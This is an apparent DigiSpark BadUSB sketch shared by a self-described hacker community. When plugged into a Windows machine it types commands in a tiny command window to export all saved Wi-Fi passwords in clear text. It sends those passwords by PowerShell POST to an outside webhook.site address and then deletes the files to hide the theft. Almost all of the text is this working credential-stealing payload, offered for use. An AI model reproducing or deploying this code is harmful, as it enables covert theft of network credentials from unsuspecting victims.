/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook.
*/
//follow our community hacker hub8
//our instagram - @hacker_hu8
//our telegram - @hacker_hub8
#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible for trying to making it as less noticeable as possible
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("cd %temp%"); //Jumping to temporary dir
  DigiKeyboard.delay(3000);  
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(5000);  
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.delay(5000);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/23d0e6b2-f17b-4c75-a371-42e3bbf52edc -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);  
  DigiKeyboard.println("el Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(5000);  
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(1000);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}


//follow our community hacker hub8
//our instagram - @hacker_hu8
//our telegram - @hacker_hub8